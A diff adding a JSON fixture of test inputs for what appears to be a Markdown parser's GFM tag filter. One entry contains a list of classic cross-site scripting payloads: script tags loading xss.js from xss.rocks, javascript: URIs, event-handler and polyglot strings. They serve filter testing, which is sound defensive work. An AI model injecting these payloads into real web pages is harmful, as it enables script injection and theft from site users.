@@ -1,0 +1,7 @@
+[
+{"name":"gfm_tagfilter.rs:12","input":"<iframe>","syntax":[]},
+{"name":"gfm_tagfilter.rs:27","input":"a <i>\n<script>","syntax":[]},
+{"name":"gfm_tagfilter.rs:58","input":"<iframe\n>","syntax":[]},
+{"name":"gfm_tagfilter.rs:74","input":"<div\n>","syntax":[]},
+{"name":"gfm_tagfilter.rs:90","input":"\n<title>\n\n<div title=\"<title>\"></div>\n\n<span title=\"<title>\"></span>\n\n<div><title></title></div>\n\n<span><title></title></span>\n\n<b><textarea></textarea></b>\n\n<script/src=\"#\">\n\n<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>\n\n<IMG SRC=\"javascript:alert('XSS');\">\n\n<IMG SRC=javascript:alert('XSS')>\n\n<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>\n\n<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"\\>\n\n<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>\n\n<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>\n\n<<SCRIPT>alert(\"XSS\");//\\<</SCRIPT>\n\n<SCRIPT SRC=http://xss.rocks/xss.js?< B >\n\n<SCRIPT SRC=//xss.rocks/.j>\n\n</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>\n\n<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>\n\njavascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>\n\n<STYLE>@import'http://xss.rocks/xss.css';</STYLE>\n","syntax":[]}
+]
